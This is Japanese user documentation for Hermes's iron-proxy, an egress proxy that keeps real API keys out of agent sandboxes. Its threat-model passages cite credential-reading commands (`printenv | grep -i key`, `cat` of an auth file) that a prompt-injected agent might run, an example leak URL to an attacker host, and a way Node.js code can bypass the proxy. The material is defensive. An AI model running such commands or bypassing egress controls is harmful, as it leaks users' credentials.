---
title: "外向き通信に資格情報を差し込むプロキシ（iron-proxy）"
description: ""
upstream_path: user-guide/egress/iron-proxy.md
upstream_blob: f38cbfa33a85b4d3c2623ba3110f57d70f8e65be
sources:
  - https://hermes-agent.nousresearch.com/docs/user-guide/egress/iron-proxy
---

# 外向き通信に資格情報を差し込むプロキシ（iron-proxy） {#egress-credential-injection-proxy-iron-proxy}

Hermes が Docker のターミナルサンドボックスの中でエージェントを動かすとき、そのサンドボックスは通常、本物の上流 API キー（`OPENROUTER_API_KEY`、`OPENAI_API_KEY` など）をそのまま抱えています。プロンプトインジェクションを受けたエージェントは、`cat ~/.config/openrouter/auth.json` や `printenv | grep -i key` を実行するだけで、それらを外へ持ち出せてしまいます。

外向き通信のプロキシはここを塞ぎます。サンドボックスが持つのは中身のわからない**プロキシ用トークン**だけで、本物のキーは渡りません。サンドボックスから外へ出る通信はすべて、ホスト側で動くローカルの [iron-proxy](https://github.com/ironsh/iron-proxy) デーモン（Apache-2.0、Go 製）を通ります。このデーモンが TLS をいったん終端し、プロキシ用トークンを本物の資格情報に差し替えてから、リクエストを上流へ転送します。サンドボックスを乗っ取られても、攻撃者の手元に残るのは、**設定された信頼済みプロキシの境界**の内側でしか通用しないトークンです。CA の秘密鍵とプロキシ側の接続先が壊されていないことも、この境界の一部です。通信を攻撃者の用意したプロキシへ向け直せる状況（CA 秘密鍵の盗難、プロキシの接続先の乗っ取りなど）では、トークンによる保証はもう成り立ちません。

今回のリリースでは、外向き通信のプロキシは Docker バックエンドにだけ組み込まれています。Modal、Daytona、SSH、Singularity には、プロキシ用の環境変数も CA のマウントも**まだ**渡されません。

## これは何か {#what-it-is}

- ホスト上で管理される `iron-proxy` のサブプロセス。必要になった時点で `~/.hermes/bin/iron-proxy` へ導入されます
- `~/.hermes/proxy/ca.crt` に置かれるローカルの CA。サンドボックス側がこれを信頼するので、iron-proxy は TLS を横取りしてヘッダーを書き換えられます
- `~/.hermes/proxy/proxy.yaml` に置かれる `proxy.yaml` 設定。許可する上流ホストと、秘密情報の差し替え対応表を書いておきます
- どのプロキシ用トークンがどの本物の環境変数に対応するかを記録した `mappings.json`

サンドボックスには `HTTPS_PROXY=http://host.docker.internal:9090`、`HTTP_PROXY=http://host.docker.internal:9091` と、`OPENROUTER_API_KEY` のような各プロバイダーの標準的な環境変数が渡され、その値は中身のわからないプロキシ用トークンになっています。診断用に `HERMES_PROXY_TOKEN_<ENV_NAME>` という別名も同時に渡されます。既存のプロバイダー SDK はいつもどおりの環境変数名を読み、プロキシ用トークンを `Authorization` に載せて送り、iron-proxy の `secrets` 変換が、ホスト側デーモンの環境から取り出した本物の値へ差し替えます。

## これは何ではないか {#what-it-is-not}

- 内向きの `hermes proxy` コマンドとは**別物**です。あちらは OAuth をまとめるリバースプロキシで、コマンド（`hermes egress`）も通信の向きも違います。
- 手元のターミナルとプロバイダーの間に入るものでは**ありません**。入るのはサンドボックスとプロバイダーの間だけです。
- ホストのプロセスがその場で行う LLM 呼び出しの資格情報を書き換えることは**ありません**。そちらは今までどおり `.env` のキーを直接使います。想定している脅威は*サンドボックス*であって、ホストではないからです。

## すぐ使い始める {#quick-start}

```bash
# 1. Install the iron-proxy binary (pinned version, SHA-256 verified)
hermes egress install

# 2. Run the wizard: generates CA, mints proxy tokens for every provider key
#    in your env, writes proxy.yaml.
hermes egress setup

# 3. Start the proxy daemon
hermes egress start

# 4. Check status
hermes egress status
```

`hermes egress setup` は、環境の中からプロバイダーのキーを見つけ出します。キーが `~/.hermes/.env` にしかなく、シェルに読み込まれていない場合でも、setup がそのファイルを自動で読むので、先に `export` しておく必要はありません。

後から `setup` をやり直したとき（許可ホストの追加、トークンの入れ替え、資格情報の取得元の変更など）は、設定をメモリ上に抱えている実行中のデーモンをいったん止めたうえで、**その場で起動し直すかどうかを尋ねてくれます**。変更をすぐ反映させたいときのための動きです。tty 上では確認され、`--restart` を渡せば必ず再起動し、`--no-restart` なら止めたままにします。それ以外のタイミングで変更を反映したいときは、停止と起動をまとめて行う `hermes egress restart` が使えます。

動き出したあと、Docker のターミナルバックエンドは自動で次を行います。

- `~/.hermes/proxy/ca.crt` をサンドボックス内の `/etc/ssl/certs/hermes-egress-ca.crt` へマウントする
- `HTTPS_PROXY`、`HTTP_PROXY`、`REQUESTS_CA_BUNDLE`、`SSL_CERT_FILE`、`CURL_CA_BUNDLE`、`NODE_EXTRA_CA_CERTS` を設定し、よく使われる HTTP 実行環境がひととおりプロキシを経由し、CA を信頼するようにする
- `NODE_OPTIONS=--use-openssl-ca` を設定し（`docker_env.NODE_OPTIONS` に元から入っている値の後ろに足されます）、Node.js が、他の CA バンドル系の変数が効く OpenSSL のストアを通るようにする。残っている穴については後述の [Node.js における CA の非対称性の注意点](#nodejs-asymmetric-ca-caveat) を参照してください
- `--add-host=host.docker.internal:host-gateway` を足し、Linux でもサンドボックスからホスト側のプロキシへ届くようにする（macOS / Windows では Docker Desktop が自動で面倒を見ます）
- プロキシ用トークンを各プロバイダーの標準的な環境変数名（たとえば `OPENROUTER_API_KEY`）で渡し、あわせて対応付け 1 件につき 1 つの診断用の別名 `HERMES_PROXY_TOKEN_<ENV_NAME>` も渡す

## 設定 {#configuration}

設定の全体は `~/.hermes/config.yaml` の `proxy:` セクションにあります。既定値はその場に書き添えてあり、すべて省略できます。

```yaml
proxy:
  # Master switch. When false the feature is a complete no-op — no
  # binaries downloaded, no docker mounts added, no subprocess started.
  enabled: false

  # Tunnel listener port. Sandboxes hit http://host.docker.internal:<port>.
  tunnel_port: 9090

  # Auto-download the pinned iron-proxy binary on first use.
  auto_install: true

  # Where iron-proxy looks up the real upstream secrets at egress time.
  #   env       — process env (default). Whatever is in your ~/.hermes/.env
  #               at proxy-start time is the source of truth.
  #   bitwarden — refetch from Bitwarden Secrets Manager on each proxy
  #               restart. Rotation in the BW web app propagates without
  #               touching .env. Requires `secrets.bitwarden.enabled: true`.
  credential_source: env

  # When true (default), the Docker backend refuses to start a sandbox if
  # the proxy is enabled but not running. Set to false to fall back to the
  # legacy "real credentials inside the sandbox" posture when the proxy
  # is unavailable.
  enforce_on_docker: true

  # When `credential_source: bitwarden` but the BWS access token /
  # project_id is missing OR the bws fetch returns no values for mapped
  # providers, the daemon raises by default (matches the spirit of "I
  # asked for rotation — don't silently use stale env values").  Set
  # to true to opt back into the legacy host-env fallback — useful for
  # migrations where you want to start switching to BW mode but haven't
  # wired every secret yet.
  allow_env_fallback: false

  # SSRF deny list applied to outbound traffic.  Omit / leave null to
  # use the safe default: loopback (v4 + v6), link-local (incl. cloud
  # metadata IPs at 169.254.169.254), RFC1918, IPv6 ULA, IPv4-mapped-v6,
  # CGNAT, and the RFC2544 benchmark range.  Set to an explicit `[]`
  # to opt out entirely (only sensible in hermetic tests).
  upstream_deny_cidrs: null

  # Extra allowed upstream hosts beyond the bundled defaults.
  # Wildcards (`*.foo.com`) are supported. The defaults cover OpenRouter,
  # OpenAI, Anthropic, Google, xAI, Mistral, Groq, Together, DeepSeek,
  # and Nous Research.
  extra_allowed_hosts: []
```

### 既定で許可されている上流ホスト {#default-allowed-upstream-hosts}

```
openrouter.ai           *.openrouter.ai
api.openai.com          api.anthropic.com
generativelanguage.googleapis.com
api.x.ai                api.mistral.ai
api.groq.com            api.together.xyz
api.deepseek.com        inference.nousresearch.com
```

エージェントが、この並びにない上流（自前で立てた推論のエンドポイント、追加のクラウド LLM、MCP サーバーなど）を必要とするなら、`proxy.extra_allowed_hosts` に足してください。ワイルドカードはホスト名の全体と突き合わせます（`*.example.com` は `api.example.com` や `staging.example.com` に当たりますが、`example.com` そのものには当たりません）。

### 既定で拒否する SSRF 用の CIDR {#default-ssrf-deny-cidrs}

許可の並びとは関係なく適用されます。これらの範囲は iron-proxy がネットワークの境界で断るので、許可済みのホスト名を使った DNS リバインディング攻撃でも、IMDS や社内ネットワークには届きません。

| CIDR | 用途 |
|---|---|
| `127.0.0.0/8`, `::1/128` | ループバック（v4 + v6） |
| `169.254.0.0/16`, `fe80::/10` | リンクローカル — **`169.254.169.254` の AWS / GCP / Azure IMDS を含む** |
| `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16` | RFC1918 |
| `fc00::/7` | IPv6 ULA |
| `::ffff:0:0/96` | IPv4 射影 IPv6 — デュアルスタック経由の IMDS 迂回を塞ぎます |
| `100.64.0.0/10` | RFC6598 CGNAT（AWS VPC や K8s の Pod ネットワークで使われます） |
| `198.18.0.0/15` | RFC2544 のベンチマーク用範囲 |

上書きしたいときは、`proxy.upstream_deny_cidrs` に自分の並びを設定します。まったく無効にしたいとき（ループバック上の上流に届く必要がある閉じたテストなど）は、空の並び `[]` を設定します。

### バインドの方針 {#bind-policy}

プロキシが `0.0.0.0` を掴むことはありません。既定のバインド先はプラットフォームごとに違います。iron-proxy v0.39 が、**デーモン 1 プロセスにつきバインド 1 つ**しか扱えないからです。

- **Linux:** docker のブリッジゲートウェイ（既定では `172.17.0.1:<tunnel_port>`）。コンテナは `host.docker.internal` 経由でプロキシに届きますが、`--add-host=host.docker.internal:host-gateway` はこの名前をまさにこのブリッジゲートウェイの IP に解決します。ループバックだけを掴んでいてはサンドボックスから届きません。ブリッジの IP はホストの `docker0` インターフェイス上のアドレスなので、LAN には露出しません。既定のブリッジネットワーク上にある他のコンテナからは届きますが、それでも発行済みのプロキシ用トークンと、許可済みの上流が必要です。docker のブリッジが見つからない場合（docker が入っていない、動いていない）は、警告を出しつつループバックへ退避します。
- **macOS / Windows の Docker Desktop:** ループバック（`127.0.0.1:<tunnel_port>`）。Desktop の VPNkit が `host.docker.internal` をホストへ向けるので、コンテナからループバックに届き、露出がいちばん少ない選び方になります。

プロキシ用トークンが漏れた LAN 上の相手でも、このプロキシは使えません。どちらのバインド先も、外のネットワークからは届かないからです。

あわせて `metrics.listen: 127.0.0.1:0` を固定し、デーモン内蔵のメトリクスサーバーが既定の `:9090` ではなく、ループバック上の空きポートを使うようにしています。そうしないと `tunnel_port: 9090` と同じソケットを取り合い、デーモンが "address already in use" で起動を断ってしまいます。なお `:0` の空きポートは起動のたびに変わり、どこにも表示されないので、この固定によってメトリクスは実質的に無効になります。

PATH の手前に置かれた悪意ある `ip` の偽物が、ブリッジのアドレスとしてプライベートでない IPv4（`0.0.0.0`、公開アドレス、マルチキャスト、リンクローカルなど）を紛れ込ませられたとしても、ループバックへの退避が効きます。`ipaddress.IPv4Address` と `is_*` の判定で確かめられなかったアドレスを掴むことは一切ありません。

## 対応している認証方式 {#covered-auth-schemes}

`secrets` 変換は、条件に当てはまる場所に現れたプロキシ用トークンを差し替えます。対象は `Authorization: Bearer` だけではありません。

| プロバイダー | 環境変数 | 差し替える場所 |
|---|---|---|
| OpenRouter、OpenAI、Groq、Together、DeepSeek、Mistral、xAI、Nous | `*_API_KEY` | `Authorization` ヘッダー |
| Anthropic ネイティブ | `ANTHROPIC_API_KEY` | `x-api-key` と `Authorization` |
| Azure OpenAI | `AZURE_OPENAI_API_KEY` | `api-key` と `Authorization`（`*.openai.azure.com`、`*.cognitiveservices.azure.com`、`*.services.ai.azure.com`） |
| Google AI Studio（Gemini） | `GEMINI_API_KEY` / `GOOGLE_API_KEY` | `x-goog-api-key` ヘッダー、またはクエリパラメーターの `?key=` |

`GEMINI_API_KEY` と `GOOGLE_API_KEY` は 1 つの資格情報として扱われます。発行されるプロキシ用トークンは 1 つで、それが**両方の**名前でサンドボックスへ渡されます。ホスト側の環境にどちらの名前があっても、見つけ出す処理は成立します。

## 対応していないプロバイダー {#uncovered-providers}

リクエストへの署名や、SDK が発行する OAuth を使う認証方式は、ヘッダーの静的な置き換えでは差し替えられません。これらの環境変数がある場合、サンドボックスはそのプロバイダーの**本物の資格情報**を抱えることになり、外向き通信を切り離す保証はそのぶん不完全になります。

| 環境変数 | プロバイダー | 理由 |
|---|---|---|
| `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY` | AWS Bedrock / SageMaker | SigV4 で署名されたリクエスト |
| `GOOGLE_APPLICATION_CREDENTIALS` | GCP Vertex AI | サービスアカウントのファイルから発行される OAuth |

これらの環境変数は、まったく別の道具（terraform、gcloud、aws CLI、ECR への push）のために、たいていの開発者のノート PC に入っています。ウィザードと `hermes egress status` では警告として表示されますが、プロキシの起動を止めることはありません。サンドボックスからこれらのプロバイダーを使わないなら、変数を `unset` すれば警告は消えます。

## Bitwarden との連携 {#bitwarden-integration}

すでに [`hermes secrets bitwarden setup`](/hermes/docs/user-guide/secrets/bitwarden/) で Bitwarden Secrets Manager を使っているなら、外向き通信のプロキシは `os.environ` の代わりに、そちらから本物の資格情報を引いてこられます。

```bash
hermes egress setup --from-bitwarden
```

これで `proxy.credential_source: bitwarden` が設定され、プロバイダーの環境変数名は BW のプロジェクトから見つけ出されます。

### 入れ替えの扱い {#rotation-semantics}

`credential_source: bitwarden` のとき、iron-proxy デーモンは**起動のたびに** `bws secret list <project_id>` で BWS から秘密情報を取り直します。つまり入れ替えの流れはこうなります。

1. Bitwarden の Web アプリでキーを入れ替える。
2. ホスト側で `hermes egress stop && hermes egress start` を実行する。
3. それ以降に起動したサンドボックスでは、プロキシ用トークンが新しい値に差し替えられる。

`.env` を触る必要はありません。ホスト側で Hermes を再起動する必要もありません。新しい値に触れるのはプロキシデーモンだけで、ホストのプロセスと `os.environ` はそのままです。

### 起動時にはっきり止まる {#fail-loud-at-start}

`credential_source: bitwarden` のとき、`hermes egress start` はウィザードの層で事前に確認し、さらに `_build_proxy_subprocess_env` がデーモンの層でもう一度確認します。

- BWS のアクセストークン用の環境変数が設定されていない → 起動を断り、`unset` して実行し直すか、`hermes egress setup --no-bitwarden` で env モードに戻す手立てを案内します
- `secrets.bitwarden.project_id` が空 → 起動を断り、`hermes secrets bitwarden setup` の実行を案内します
- `bws secret list` が、対応付けたプロバイダーのうち 1 つ以上について値を返さない → 足りない名前を挙げたうえで起動を断ります

これは意図した動きです。BW モードでホストの環境変数へ退避してしまうと、BW を選んだ理由そのもの（古い値が使われ続ける問題）が戻ってきます。入れ替えの保証がほしくて BW にしたのに、黙って退避されてはその保証が壊れてしまいます。

設定の `proxy.allow_env_fallback: true` を立てると、「BWS に届かなければ黙ってホストの環境変数へ退避する」という以前の動きに戻せます。秘密情報を 1 つずつ BW へ移している最中で、その時点で使える値だけでデーモンを起動させたい、といった移行期に使ってください。

### 資格情報の取得元を切り替える {#switching-credential-source}

| 元 | 先 | コマンド |
|---|---|---|
| env | bitwarden | `hermes egress setup --from-bitwarden` |
| bitwarden | env | `hermes egress setup --no-bitwarden` |

**どちらのフラグも付けずに `hermes egress setup` をやり直した場合、今の `credential_source` はそのまま保たれます。** ウィザードが、黙って env へ引き戻すことを断るからです。これが効いてくるのは、いったん bitwarden モードにしたなら、入れ替えの保証こそが選んだ理由だからです。変えるには「env に戻したい」と自分で明示する必要があります。

## スラッシュコマンド {#slash-commands}

CLI のサブコマンドの構成です。

```
hermes egress install                  # download the pinned iron-proxy binary
hermes egress install --force          # re-download even if a managed copy exists

hermes egress setup                    # interactive wizard
hermes egress setup --tunnel-port N    # override the tunnel listener port
hermes egress setup --from-bitwarden   # use BWS as credential source (fail-loud)
hermes egress setup --no-bitwarden     # explicitly switch back to env mode
hermes egress setup --rotate-tokens    # mint fresh tokens for every provider
                                       #   (default preserves existing)

hermes egress start                    # spawn the managed proxy daemon
hermes egress stop                     # SIGTERM (then SIGKILL after 5s grace)
hermes egress restart                  # stop (if running) then start — needed when
                                       #   upstream SECRETS change (rotation, new provider)
hermes egress reload                   # hot-reload the ruleset from proxy.yaml via the
                                       #   management API — no restart, no dropped
                                       #   connections (allowlist / mapping edits)

hermes egress status                   # binary + config + pid + listening state + mappings
hermes egress status --show-tokens     # print proxy tokens in full
                                       #   (default: redacted prefix + suffix only)

hermes egress disable                  # flip proxy.enabled = false
                                       #   (does not stop a running proxy)

hermes egress config                   # print the path to proxy.yaml for debugging
```

### トークンの入れ替え {#token-rotation}

`hermes egress setup` は既定で、すでにプロキシ用トークンを持っているプロバイダーについては、そのトークンを**そのまま残します**。プロバイダーを追加したときは、新しいものだけに新しいトークンを発行し、既存のトークンは変わりません。ウィザードをやり直したときに、動いているサンドボックスが 401 になってしまうのを避けるためです。

`--rotate-tokens` はすべてのトークンを作り直します。

```bash
hermes egress setup --rotate-tokens
```

すでにトークンがあり、なおかつ標準入力が tty のとき、ウィザードは確認を求めます。

```
⚠  --rotate-tokens will invalidate proxy tokens in every running
   Hermes sandbox.  They will start 401-ing against upstreams until restarted.
Type 'rotate' to confirm:
```

tty 以外からの実行（CI やスクリプト）では確認を飛ばします。フラグが意図的に付けられたものとして扱うからです。上書きの前には、そのときの `mappings.json` が時刻付きの名前で同じ場所に複製され、手作業で戻せるようにしてあります。

```
backup: ~/.hermes/proxy/mappings.json.rotated-20260524T143012
```

`hermes egress setup` は、設定やトークンの対応付けを書き換えるときに、動いているデーモンを止めます。デーモンが古い YAML をメモリに抱えているからです。`--rotate-tokens` のあとは次を実行します。

```bash
hermes egress start
```

すでに動いているコンテナは古いトークンを抱えたままなので、新しいトークンを受け取るには起動し直す必要があります。新しく作られる永続的な Docker コンテナには、外向き通信の状態を示すラベルが付くので、Hermes が、egress を入れる前や入れ替え前のコンテナを新しいセッションに使い回すことはありません。

## 状態ディレクトリの構成 {#state-directory-layout}

iron-proxy が保つものはすべて `~/.hermes/proxy/` の中にあります。

| パス | モード | 用途 |
|---|---|---|
| `~/.hermes/proxy/` (dir) | `0o700` | 所有も出入りも本人だけ |
| `ca.crt` | `0o644` | サンドボックスへ配る公開用の CA 証明書 |
| `ca.key` | `0o600` | CA の署名鍵 — ホストの外には出ません |
| `proxy.yaml` | `0o600` | iron-proxy の設定。`setup` のたびに書き直されます |
| `mappings.json` | `0o600` | サンドボックスのプロキシ用トークンと上流の環境変数の対応 |
| `mappings.json.rotated-*` | `0o600` | `--rotate-tokens` が作る控え |
| `iron-proxy.pid` | `0o600` | 動いているデーモンの PID |
| `iron-proxy.nonce` | `0o600` | PID の使い回しに備える、起動ごとの使い捨ての値 |
| `iron-proxy.log` | `0o600` | デーモンの標準出力・標準エラー出力 — **v0.39 ではリクエストごとの記録も含みます** |
| `audit.log` | `0o600` | 将来のバイナリ版で、リクエストごとの記録を専用に流すために確保してあります。上流が対応したときにも扱いの約束が保たれるよう、先に作ってあります |

いちばん扱いに気をつけるべきファイルは CA の秘密鍵です。最初の 1 バイト目から `0o600` で作られ（umask の隙間を突かれる余地がありません）、`O_NOFOLLOW` を使うので、同じ uid の攻撃者がシンボリックリンクを仕込んで書き先をずらすこともできません。pid のファイル、使い捨ての値のファイル、デーモンのログ、監査ログも同じ扱いです。

### iron-proxy v0.39 でのログ {#logging-on-iron-proxy-v039}

今固定しているバイナリ版（**v0.39.0**）では、iron-proxy はすべての出力（デーモン側の診断情報も、リクエストごとの記録も）を **`~/.hermes/proxy/iron-proxy.log`** へ書き出します。v0.39 の `config.Log` 構造体には `audit_path` という項目がなく、リクエストごとの記録を別の流れへ振り分けられないからです。

それでも `~/.hermes/proxy/audit.log` を `0o600` と `O_NOFOLLOW` で先に作っているのは、次の理由からです。

1. 将来の版上げのために場所を押さえておけます。固定するバイナリ版が `log.audit_path` に対応したものへ移れば、運用側で設定をやり直さなくても、リクエストごとの記録がそちらへ流れ始めます。**それまでこのファイルは 0 バイトのままです。監視・通知・調査の道具の向き先にまだしないでください。** 今日の時点では、すべて `iron-proxy.log` を見てください。
2. 最初の 1 バイト目から 0o600 という約束が、上流の修正が入る日に効きます。v0.40 以降は、ファイルがまだ無ければ自分の umask で作ってしまうからです。

その版上げが来るまでは、`iron-proxy.log` を両方の読み手にとっての正本として扱ってください。

- デーモン側の出来事（起動時の表示、バインドの失敗、終了の理由、変換の失敗）。運用と切り分けのために使います。
- リクエストごとの記録（許可済みの上流への CONNECT、秘密情報の差し替えが起きたこと、許可の並びによる拒否）。調査と説明責任のために使います。

どちらのファイルも、再起動をまたいで追記されていきます。長く動かすホストでディスクの使用量が気になるなら、logrotate で回してください。

## 仕組み {#how-it-works}

```
┌──────────────┐                ┌──────────────┐                ┌─────────────┐
│ Docker       │ CONNECT /     │ iron-proxy    │ HTTPS w/       │ OpenRouter  │
│ sandbox      ├──────────────▶│ (host:9090)   ├───────────────▶│ / OpenAI /  │
│              │ HTTP forward  │               │ real API key   │ Anthropic …  │
│ has:         │ w/ proxy tok  │ mints leaf    │                │             │
│ - proxy tok  │ in Auth hdr   │ cert from CA  │                │             │
│ - CA cert    │               │ matches token │                │             │
│ - HTTPS_PROXY│               │ swaps secret  │                │             │
└──────────────┘               └──────────────┘                └─────────────┘
                                       │
                                       │ daemon + per-request log (combined on v0.39)
                                       ▼
                              ~/.hermes/proxy/iron-proxy.log
                              (~/.hermes/proxy/audit.log reserved for v0.40+ split stream)
```

1. サンドボックスが HTTPS のリクエストを出します。たとえば `POST https://openrouter.ai/v1/chat/completions` に `Authorization: Bearer hermes-proxy-openrouter-…`（本物のキーではなく、プロキシ用トークン）を付けたものです。
2. `HTTPS_PROXY` が設定されているので、リクエストは CONNECT のトンネルとして iron-proxy へ向かいます。
3. iron-proxy が許可の並びを確認します。`openrouter.ai` は許可されています。
4. iron-proxy が `openrouter.ai` 向けに、こちらの CA で署名した末端の証明書を発行し、TLS の接続を終端して、リクエストの中身を見ます。
5. `secrets` 変換が `Authorization` ヘッダーの中のプロキシ用トークンの文字列を見つけ、iron-proxy 自身の環境から取り出した本物の `OPENROUTER_API_KEY` の値に差し替えます。
6. リクエストは暗号化し直され、OpenRouter へ転送されます。
7. v0.39 では、リクエストの記録は `~/.hermes/proxy/iron-proxy.log` に残ります。固定するバイナリ版が流れの分割に対応したもの（v0.40 以降）になれば、リクエストごとの記録は `~/.hermes/proxy/audit.log` へ流れ、デーモン側の診断情報は `iron-proxy.log` に残ります。[iron-proxy v0.39 でのログ](#logging-on-iron-proxy-v039) を参照してください。

許可の並びにないホストへのリクエスト（たとえば `https://attacker.example.com/leak?key=...`）は、1 バイトもホストの外へ出ないうちに HTTP 403 で断られます。断った記録は、上流のホスト名と、どのサンドボックスから来たかとあわせて `iron-proxy.log` に残ります。

### サンドボックスへの CA の配り方 {#ca-distribution-into-the-sandbox}

`proxy.enabled: true` で、なおかつデーモンが待ち受けている状態で Docker バックエンドがコンテナを起動するとき、`docker run` に次の引数が足されます。

| 引数 | 用途 |
|---|---|
| `-v ~/.hermes/proxy/ca.crt:/etc/ssl/certs/hermes-egress-ca.crt:ro` | CA を読み取り専用でマウントします |
| `-e HTTPS_PROXY=http://host.docker.internal:9090` | Python の httpx、curl、go の既定のトランスポート、Node の fetch 向け |
| `-e HTTP_PROXY=http://host.docker.internal:9091` | 平文 HTTP 用の curl と wget 向け。平文 HTTP を転送する待ち受けは `tunnel_port + 1` にあります |
| `-e NO_PROXY=127.0.0.1,localhost,::1` | サンドボックス内のループバック上の開発サーバーはプロキシを通しません |
| `-e REQUESTS_CA_BUNDLE=…ca.crt` | Python の `requests` 向け |
| `-e SSL_CERT_FILE=…ca.crt` | Python の `ssl` モジュールと OpenSSL 向け — システムのストアを**置き換えます** |
| `-e CURL_CA_BUNDLE=…ca.crt` | curl 向け — システムのストアを**置き換えます** |
| `-e NODE_EXTRA_CA_CERTS=…ca.crt` | Node.js 向け — システムのストアに**足します** |
| `-e NODE_OPTIONS="<your value> --use-openssl-ca"` | Node.js 向け — OpenSSL のストアを通させます（後ろに足すので、`--max-old-space-size` などの指定はそのまま残ります） |
| `-e HERMES_EGRESS_PROXY=1` | エージェントが読んで、プロキシ前提の環境だと分かるための目印 |
| `-e OPENROUTER_API_KEY=<proxy-token>` | 既存の SDK がそのまま動くよう、各プロバイダーの標準的な環境変数名でプロキシ用トークンを渡します |
| `-e HERMES_PROXY_TOKEN_<NAME>=…` | 対応付けごとの診断用の別名。値は標準的なプロバイダーの環境変数と同じです |
| `--add-host=host.docker.internal:host-gateway` | Linux でのみ必要です。Docker Desktop では自動で割り当てられます |

#### Node.js における CA の非対称性の注意点 {#nodejs-asymmetric-ca-caveat}

`REQUESTS_CA_BUNDLE`、`SSL_CERT_FILE`、`CURL_CA_BUNDLE` は、サンドボックス内のシステムの CA ストアを**置き換えます**。`NODE_EXTRA_CA_CERTS` はそこに**足します**。そのため、サンドボックス内の Node.js のプロセスは、原理上は生の `net.Socket` を開いて自前で TLS の handshake を始めれば、プロキシを迂回できてしまいます。システムの CA ストアが本物の上流の証明書を信頼したままなので、Python や curl なら検証で失敗する通信が、こちらでは成功します。

`NODE_OPTIONS=--use-openssl-ca` は、`docker_env.NODE_OPTIONS` に元から入っている値の後ろに足されます。これで Node は `SSL_CERT_FILE` が効く OpenSSL のストアを通るようになり、非対称さが小さくなります。`tls.connect()` や `https.request()` に自前の `ca` を明示的に渡すコードまでは押さえられませんが、いちばん起こりやすい形は塞げます。

これは v1 の既知の制限です。上流での解決については [github.com/ironsh/iron-proxy/issues](https://github.com/ironsh/iron-proxy/issues) を追ってください。それまでは、外向き通信の切り離しを頼りにしているサンドボックスの中で、生のソケットを開くような信頼できない Node のコードを走らせないでください。

### docker\_env とのぶつかり {#dockerenv-collisions}

`docker_env:` の設定ブロックで、プロキシの動きを左右する環境変数を自分で設定している場合（まれですが起こり得ます）、`enforce_on_docker: true` のとき Hermes はサンドボックスの起動を断ります。対象は次の両方です。

- 外向き通信を制御する変数: `HTTPS_PROXY`、`HTTP_PROXY`、`NO_PROXY`、`REQUESTS_CA_BUNDLE`、`SSL_CERT_FILE`、`CURL_CA_BUNDLE`、`NODE_EXTRA_CA_CERTS`
- 本物のプロバイダーの環境変数: `mappings.json` にあるすべての名前（`OPENROUTER_API_KEY`、`OPENAI_API_KEY` など）

エラーの例です。

```
docker_env in config.yaml overrides egress-proxy variables
['HTTPS_PROXY', 'OPENROUTER_API_KEY']; enforce_on_docker is enabled.
Remove these keys from docker_env or disable enforce_on_docker to
opt out of egress isolation.
```

`enforce_on_docker: false` の場合、同じ状況は警告として表示され、`docker_env` の値のほうが優先されます。移行や試験のときには役に立ちますが、切り離しの保証を自分から手放すことになります。

## PID と使い捨ての値による守り {#pid-and-nonce-defense}

デーモンの pid のファイルは、`O_EXCL` と `O_NOFOLLOW`、それに所有者の確認を伴って書かれます。`hermes egress start` を同時に呼んだ場合、次のどちらかになります。

- 既にある pid のファイルが生きている iron-proxy を指している → 後から来たほうは「another start in progress」と断り、`hermes egress stop` の実行を案内します
- 既にある pid のファイルが古い（デーモンが落ちている） → 後から来たほうがそれを消し、一度だけやり直します

さらに `start_proxy` は毎回、新しい使い捨てのランダムな値を 2 か所に置きます。

- デーモンの環境の `HERMES_IRON_PROXY_NONCE=<nonce>`
- `~/.hermes/proxy/iron-proxy.nonce`（pid のファイルと同じ場所に 0o600 で置かれます）

`hermes egress stop`（や他の `_pid_alive` の確認）が、その PID が今も*こちらの*デーモンを指しているのか（iron-proxy が落ちたあとに同じ PID を割り当てられた無関係なプロセスではないか）を確かめたいとき、`/proc/<pid>/environ` を読んでこの値を探します。ディスク上の控えがあるおかげで、CLI の呼び出しをまたいでもこれが成立します（メモリ上の `_proxy_nonce` はプロセスごとのもので、`hermes` を呼ぶたびにリセットされるからです）。

この確認に失敗した場合、コードは `argv[0]` のファイル名部分を `iron-proxy` と突き合わせる方法に切り替えます。`stop_proxy` はさらに、SIGTERM の前に `/proc/<pid>/stat` の起動時刻を控えておき、5 秒の猶予のあとでもう一度確かめます。起動時刻がずれていれば、待っている間に PID が使い回されたということなので、SIGKILL は送らずに警告を出します。

## セキュリティのモデル {#security-model}

**これが守るもの:**

- Docker サンドボックス内でプロンプトインジェクションを受けたエージェントが、`printenv` や資格情報のファイルを読んで本物のキーを持ち出すこと。
- サンドボックス内の汚染された依存パッケージが、任意のホストへ通信を始めること。既定で拒否する許可の並びが、知らない宛先を塞ぎます。
- エージェントがクラウドのメタデータのエンドポイント（`169.254.169.254`）を叩くこと。iron-proxy は `upstream_deny_cidrs` によって、IPv4 射影 IPv6 の形（`::ffff:169.254.169.254`）も含めて既定で断ります。
- 許可済みのホスト名からプライベートな IP への DNS リバインディング。拒否する CIDR は、許可を判定する時点ではなく、接続する時点で確認されます。
- 同じ uid のローカルのプロセスが、iron-proxy デーモンの環境を読んで秘密情報をすくい取ること。対応付けで参照されている環境変数の名前だけが渡され、ホストの環境の全部が渡ることはありません。
- サンドボックスのプロキシ用トークンが漏れた LAN 上の相手が、API の利用枠を使ってしまうこと。プロキシは docker のブリッジゲートウェイ（Linux）かループバック（Docker Desktop）を掴み、`0.0.0.0` は決して掴まないので、外のネットワークからは届きません。

**これが守らないもの:**

- 汚染されたホストのプロセス。エージェントのプロセス自体が乗っ取られていれば、ホストの `~/.hermes/.env` にある本物のキーはいずれにせよ露出します。これは*サンドボックス*が乗っ取られた場合の多層防御であって、ホストが乗っ取られた場合のものではありません。
- **信頼済みプロキシの境界そのものが失われること。** トークンを差し替える保証は、サンドボックスがマウントされた CA 証明書（`/etc/ssl/certs/hermes-egress-ca.crt`）を信頼していること、そして通信が実際に*こちらの* iron-proxy に届くことを前提にしています。CA の秘密鍵が盗まれたり、サンドボックスからの外向き通信が攻撃者の用意したプロキシへ向け直されたりすれば、間に入った相手が正しく見える末端の証明書を出せてしまい、プロキシ用トークンはもう意味のある境界ではなくなります（[MITRE ATT&CK T1588.004](https://attack.mitre.org/techniques/T1588/004/) の、手に入れた TLS の証明書材料による中間者攻撃を参照）。CA の鍵（`0600` でホストの中だけにあります）とプロキシの接続先は、それにふさわしく守ってください。
